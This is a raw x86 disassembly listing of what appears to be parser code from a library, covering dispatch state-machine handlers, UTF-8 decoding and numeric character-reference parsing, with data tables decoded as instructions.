pop ebp
retn
movzx eax [ eax + lookup_table_10077984 ]
jmp [ eax * 4 + jump_table_1007796c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x38
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
add esp 0x4
mov [ eax ] 0x39
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x3a
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x25
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
sub_1007798a
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_100779d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10077ad0 ]
jmp [ eax * 4 + jump_table_10077ab8 ]
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x39
mov eax 0x2
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x3a
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
sub_10077ad6
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10077c14 ]
jmp [ eax * 4 + jump_table_10077c00 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x3b
call sub_10073600
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10016b30
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10073600
mov eax [ ebp + 0x14 ]
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10073600
mov eax [ ebp + 0x14 ]
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
sub_10077c19
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_10077c60
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10077d64 ]
jmp [ eax * 4 + jump_table_10077d50 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x3b
call sub_10073600
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10016b30
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10073600
mov eax [ ebp + 0x14 ]
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10073600
mov eax [ ebp + 0x14 ]
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
sub_10077d69
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10077db0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
add esp 0x4
mov [ ecx ] 0x42
mov [ edx + 0x88 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10077eb4 ]
jmp [ eax * 4 + jump_table_10077e9c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3c
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
call sub_100737a0
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
add esp 0x4
mov [ edx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov ecx 0x1
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x88 ] ecx
lea eax [ ecx + 0x1 ]
pop esi
pop ebp
retn
sub_10077eba
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_10077f00
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x42
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10077fe8 ]
jmp [ eax * 4 + jump_table_10077fd0 ]
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_100737a0
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ eax ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
sub_10077fee
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_10078030
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
add esp 0x4
mov [ ecx + 0x88 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007814c ]
jmp [ eax * 4 + jump_table_10078134 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3e
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
add esp 0x4
mov [ eax ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
sub_10078152
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_10078190
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
add esp 0x4
mov [ ecx + 0x88 ] 0x1
movzx eax [ eax + lookup_table_10078280 ]
jmp [ eax * 4 + jump_table_10078268 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_10078286
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_100783c4 ]
jmp [ eax * 4 + jump_table_100783b0 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x41
call sub_10073670
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10016b30
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10073670
mov eax [ ebp + 0x14 ]
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10073670
mov eax [ ebp + 0x14 ]
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
sub_100783c9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_10078410
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10078514 ]
jmp [ eax * 4 + jump_table_10078500 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x41
call sub_10073670
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10016b30
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10073670
mov eax [ ebp + 0x14 ]
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10073670
mov eax [ ebp + 0x14 ]
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
sub_10078519
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10078560
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x42
movzx eax [ eax + lookup_table_100785fc ]
jmp [ eax * 4 + jump_table_100785ec ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_100737a0
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_10078600
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10078640
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0x3e
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
cmp eax 0xffffffff
je r-xdata
mov eax 0x2
pop ebp
retn
sub_10078680
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xffffffff
push esi
mov esi [ ebp + 0xc ]
push edi
je r-xdata
lea edi [ esi + 0x94 ]
push edi
mov [ esi + 0x4 ] 0x1
call sub_1004ac70
mov [ esi + 0x2c ] eax
add esi 0x30
push esi
push edi
call sub_10037120
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
add esp 0xc
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
push 0x1
push 0x3
lea eax [ esi + 0x94 ]
push r--data
push eax
call sub_1002a720
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10078710
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x2c ]
push eax
call sub_10016600
mov esi eax
xor ebx ebx
add esp 0x4
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx [ edi + 0x18 ]
mov [ esi + 0x8 ] edx
mov eax [ edi + 0x1c ]
mov [ esi + 0xc ] eax
mov ecx [ edi ]
mov [ esi + 0x10 ] ecx
mov eax [ edi + 0x10 ]
xor ecx ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] eax
cmp eax ebx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ecx
mov edx [ edi ]
mov [ ebp - 0x4 ] edx
nop
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + ecx ]
shld edi ebx 0x8
cdq
shl ebx 0x8
or edx edi
inc ecx
or ebx eax
mov [ ebp - 0xc ] edx
cmp ecx [ ebp - 0x8 ]
jl r-xdata
sub_10078790
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ esi ]
mov al [ ecx ]
push ebx
xor ebx ebx
xor dl dl
push edi
mov [ ebp - 0x4 ] ebx
cmp al 0x80
jae r-xdata
cmp al 0xc0
jb r-xdata
mov [ esi + 0x10 ] 0x1
or dl 0xff
jmp r-xdata
mov ebx 0x1
mov [ esi + 0x10 ] ebx
cmp al 0xe0
jae r-xdata
and al dl
movzx eax al
cdq
mov [ ebp - 0x8 ] edx
mov edx [ esi + 0x10 ]
mov edi eax
mov eax [ esi + 0x8 ]
add edx ecx
cmp edx eax
jbe r-xdata
mov ecx 0x1
cmp [ esi + 0x10 ] ecx
jle r-xdata
sub eax ecx
mov [ esi + 0x10 ] eax
push 0x1
mov eax esi
call sub_10078710
mov ebx 0x1
add esp 0x4
mov [ ebp - 0x4 ] ebx
cmp al 0xf0
jae r-xdata
mov [ esi + 0x10 ] 0x2
mov dl 0x1f
cmp al 0xc2
jae r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
ja r-xdata
jmp r-xdata
cmp al 0xf5
jae r-xdata
mov [ esi + 0x10 ] 0x3
mov dl 0xf
jmp r-xdata
mov ebx 0x1
jmp r-xdata
push 0x0
mov eax esi
call sub_10078710
add esp 0x4
mov eax 0xfffd
pop edi
mov [ ebp - 0x8 ] 0x0
mov [ esi + 0xc ] eax
pop ebx
mov esp ebp
pop ebp
retn
jb r-xdata
mov eax [ esi ]
mov al [ eax + ecx ]
lea edx [ eax + 0x80 ]
cmp dl 0x3f
ja r-xdata
cmp al 0xf8
jae r-xdata
mov [ esi + 0x10 ] 0x4
mov dl 0x7
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
cmp edi 0x10ffff
ja r-xdata
mov [ esi + 0x10 ] ecx
mov ebx 0x1
mov ebx [ ebp - 0x8 ]
movzx eax al
shld ebx edi 0x6
and eax 0xffffff7f
cdq
shl edi 0x6
or edx ebx
inc ecx
or edi eax
mov [ ebp - 0x8 ] edx
cmp ecx [ esi + 0x10 ]
jl r-xdata
cmp al 0xfc
jae r-xdata
mov [ esi + 0x10 ] 0x5
mov ebx 0x1
jmp r-xdata
cmp edi 0x1
jl r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
cmp al 0xfe
jae r-xdata
mov [ esi + 0x10 ] 0x6
mov ebx 0x1
jmp r-xdata
cmp edi 0xb
je r-xdata
cmp edi 0x8
jle r-xdata
mov [ esi + 0x10 ] 0x7
mov ebx 0x1
jmp r-xdata
cmp edi 0xe
jl r-xdata
cmp edi 0x7f
jl r-xdata
cmp edi 0x1f
jle r-xdata
cmp edi 0xfdd0
jl r-xdata
cmp edi 0x9f
jle r-xdata
mov eax edi
and eax 0xffff
cmp eax 0xfffe
je r-xdata
cmp edi 0xfdef
jle r-xdata
cmp eax 0xffff
jne r-xdata
cmp edi 0xd
jne r-xdata
mov [ esi + 0xc ] edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
jne r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x10 ]
add eax ecx
cmp eax [ esi + 0x8 ]
jae r-xdata
mov eax 0xa
pop edi
mov [ ebp - 0x8 ] 0x0
mov [ esi + 0xc ] eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0xa
jne r-xdata
inc ecx
inc [ esi + 0x1c ]
mov [ esi ] ecx
sub_10078970
push ebp
mov ebp esp
push esi
push eax
call sub_10016600
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10030b10
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov [ esi ] edx
cdq
add esp 0x8
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
sub_100789b0
push ebp
mov ebp esp
sub esp 0x8
push esi
push ebx
call sub_10032470
xor esi esi
push ebx
mov [ ebp - 0x4 ] esi
call sub_1003c6e0
add esp 0x8
cmp eax 0x78
je r-xdata
push ebx
mov [ ebp - 0x4 ] 0x1
call sub_10032470
push ebx
call sub_1003c6e0
mov esi [ ebp - 0x4 ]
add esp 0x8
cmp eax 0x58
jne r-xdata
test esi esi
je r-xdata
mov eax ecx
jmp r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0x9
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10016600
mov esi eax
add esp 0x4
test esi esi
je r-xdata
lea ecx [ eax - 0x61 ]
cmp ecx 0x5
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_10004030
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ ecx ] 0xffffffff
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10030b10
add esp 0x8
mov [ esi ] 0x3
lea edx [ eax - 0x41 ]
cmp edx 0x5
ja r-xdata
add eax 0xffffffa9
jmp r-xdata
push edi
xor edi edi
neg esi
sbb esi esi
and esi 0x6
mov [ ebp - 0x8 ] 0x1
add esi 0xa
lea ebx [ ebx ]
add eax 0xffffffc9
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ecx
jmp r-xdata
push ebx
call sub_1003c6e0
add esp 0x4
cmp eax 0x3b
je r-xdata
lea ecx [ eax - 0x61 ]
cmp ecx 0x5
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_10032470
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_10016600
mov esi eax
add esp 0x4
test esi esi
je r-xdata
lea edx [ eax - 0x41 ]
cmp edx 0x5
ja r-xdata
add eax 0xffffffa9
jmp r-xdata
imul edi esi
push ebx
add edi eax
call sub_10032470
push ebx
call sub_1003c6e0
lea ecx [ eax - 0x30 ]
add esp 0x8
cmp ecx 0x9
ja r-xdata
mov ecx [ ecx * 8 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp ecx 0xffffffff
je r-xdata
mov eax [ ecx * 8 + r--data ]
inc ecx
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
push esi
push ebx
call sub_10030b10
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x4
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
add eax 0xffffffc9
cmp edi 0xd800
jl r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10016600
mov esi eax
add esp 0x4
test esi esi
je r-xdata
cmp eax edi
je r-xdata
xor ecx ecx
xor eax eax
cmp edi 0x10ffff
jle r-xdata
cmp edi 0xdfff
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10030b10
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
push edi
call sub_1003bd40
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10016600
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push edi
push 0x5
push ebx
